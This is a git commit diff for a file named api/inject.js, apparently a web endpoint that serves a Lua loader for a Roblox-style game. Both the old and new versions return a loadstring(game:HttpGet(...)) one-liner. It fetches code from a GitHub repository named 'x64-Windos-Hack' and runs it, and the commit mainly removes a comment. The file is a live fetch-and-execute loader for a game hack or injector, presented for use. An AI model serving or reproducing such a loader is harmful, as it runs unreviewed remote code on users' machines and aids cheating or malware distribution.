2371fcf7d5e98d04ef7f6b05560185d817498e7b
Dkzin.rlk <79470887+SrDark222@users.noreply.github.com>
2025-06-14 20:00:39 -0300

    Update inject.js

--- api/inject.js
+++ api/inject.js
@@ -1,6 +1,4 @@
 export default function handler(req, res) {
   res.setHeader("Content-Type", "text/plain");
-  res.send(`-- Executa auto
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()
-`);
-  }
+  res.send(`loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()`);
+}
